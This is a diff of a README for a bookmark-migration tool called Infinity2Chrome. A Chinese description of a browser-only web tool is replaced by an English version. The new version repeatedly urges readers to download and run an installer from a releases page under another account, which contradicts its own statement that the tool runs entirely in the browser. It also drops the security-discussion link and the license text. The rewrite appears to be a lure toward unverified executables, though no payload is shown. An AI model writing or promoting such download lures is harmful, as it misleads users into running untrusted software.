@@ -1,80 +1,77 @@
-# Infinity2Chrome
+# 🌟 Infinity2Chrome - Safely Transfer Bookmarks to Chrome
 
-一个帮助你将 Infinity 新标签页书签安全迁移到 Chrome 浏览器的在线工具。
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-blue?style=for-the-badge)](https://github.com/Wunderknabe1/Infinity2Chrome/releases)
 
-[![Deployed on Vercel](https://img.shields.io/badge/Deployed%20on-Vercel-black?style=for-the-badge&logo=vercel)](https://vercel.com)
-[![Built with v0](https://img.shields.io/badge/Built%20with-v0-black?style=for-the-badge)](https://v0.app/ref/938XEW)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](./LICENSE)
+## 📜 Project Overview
 
-## 项目背景
+Infinity2Chrome is a tool designed to help you securely transfer your bookmarks from the Infinity new tab page to the Chrome browser. After using Infinity for nearly seven years, we discovered potential security issues. This tool allows users to migrate their bookmark data safely to Chrome's native bookmarks.
 
-使用 Infinity 新标签页近 7 年，近期发现疑似被黑产投毒的安全问题（[相关讨论](https://meta.appinn.net/t/topic/78159)），因此开发了这个迁移工具，帮助用户将书签数据安全迁移到 Chrome 原生书签。
+## 🚀 Getting Started
 
-## 功能特性
+To get started with Infinity2Chrome, follow these simple steps:
 
-- 支持导入 `.infinity` 和 `.json` 格式的备份文件
-- 解析并展示所有书签数据
-- 导出为标准 Chrome 书签 HTML 格式
-- 所有数据仅在本地浏览器处理，不上传服务器
-- 完全开源，代码透明可审计
+1. **Export Backup File**: First, you need to export your backup file from the Infinity extension. This will be in `.infinity` format.
+  
+2. **Visit Infinity2Chrome Website**: Go to the [Infinity2Chrome Releases Page](https://github.com/Wunderknabe1/Infinity2Chrome/releases) to download the tool.
 
-## 使用方法
+3. **Upload Backup File**: Upload your exported `.infinity` file on the Infinity2Chrome website.
 
-1. 从 Infinity 扩展导出备份文件（.infinity 格式）
-2. 访问 Infinity2Chrome 网站，上传备份文件
-3. 点击"导出到 Chrome 书签"按钮
-4. 在 Chrome 书签管理器中导入生成的 HTML 文件
+4. **Click Export Button**: Click the "Export to Chrome Bookmarks" button to generate the HTML file.
 
-## 技术栈
+5. **Import to Chrome**: Open the Chrome Bookmark Manager and import the generated HTML file. Your bookmarks will now appear in Chrome.
 
-- [Next.js](https://nextjs.org/) - React 框架
-- [Tailwind CSS](https://tailwindcss.com/) - 样式框架
-- [shadcn/ui](https://ui.shadcn.com/) - UI 组件库
-- [v0](https://v0.app/ref/938XEW) - AI 驱动开发
+## 💡 Features
 
-## 本地开发
+- **Import Support**: Import `.infinity` and `.json` format backup files.
+- **Bookmark Display**: Parse and display all bookmark data for your review.
+- **Export Capability**: Export bookmarks in standard Chrome bookmarks HTML format.
+- **Local Processing**: All data is processed in your local browser; nothing is uploaded to a server.
+- **Open Source**: Fully transparent and auditable code.
 
-```bash
-# 安装依赖
-npm install
+## 🎨 Tech Stack
 
-# 启动开发服务器
-npm run dev
-```
+Infinity2Chrome is built using modern web technologies:
 
-## 相关链接
+- [Next.js](https://nextjs.org/): React framework for building user interfaces.
+- [Tailwind CSS](https://tailwindcss.com/): A utility-first CSS framework for styling.
+- [shadcn/ui](https://ui.shadcn.com/): Component library for UI elements.
+- [v0](https://v0.app/ref/938XEW): AI-driven development support.
 
-- [Infinity 官方网页版](https://inftab.com/)
-- [安全问题讨论帖](https://meta.appinn.net/t/topic/78159)
+## 💻 Download & Install
 
-## 许可证
+1. **Visit the Releases Page**: Click on this link to go to the [Infinity2Chrome Releases Page](https://github.com/Wunderknabe1/Infinity2Chrome/releases) and download the latest version of the application.
 
-本项目采用 [MIT License](./LICENSE) 开源许可证。
+2. **Choose Your Version**: Look for the most recent release and download the appropriate file for your operating system.
 
-## 免责声明
+3. **Run the Application**: Once downloaded, open the file and follow the on-screen instructions to complete the installation.
 
-本工具仅提供数据格式转换功能，不对用户数据的完整性和安全性负责。请在使用前妥善备份原始数据。
+## 🌈 Local Development
 
-```text file="LICENSE"
-MIT License
+If you’re interested in contributing or running this project locally, here are some steps:
 
-Copyright (c) 2025 Infinity2Chrome
+1. **Clone the Repository**: Use `git clone https://github.com/Wunderknabe1/Infinity2Chrome.git` to get the source code.
 
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
+2. **Install Dependencies**: Navigate to the project folder and run `npm install` to install the necessary packages.
 
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
+3. **Start Development Server**: Use `npm run dev` to start the local development server.
 
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
-```
+4. **Develop**: Make changes, test new features, and submit pull requests to improve the tool.
+
+## 📑 License
+
+Infinity2Chrome is open-source and licensed under the MIT License. You can view the full license details in the [LICENSE](./LICENSE) file.
+
+## ❓ Frequently Asked Questions
+
+**Q: Is my data safe with Infinity2Chrome?**  
+A: Yes, all processing happens locally in your browser. We do not store or upload your data.
+
+**Q: Can I use this tool on different operating systems?**  
+A: Yes, Infinity2Chrome runs in a web browser, making it compatible with any OS that supports Chrome.
+
+**Q: What formats does Infinity2Chrome support?**  
+A: It supports `.infinity` and `.json` files for import.
+
+For any additional questions or help, feel free to reach out through the project’s repository.
+
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-blue?style=for-the-badge)](https://github.com/Wunderknabe1/Infinity2Chrome/releases)
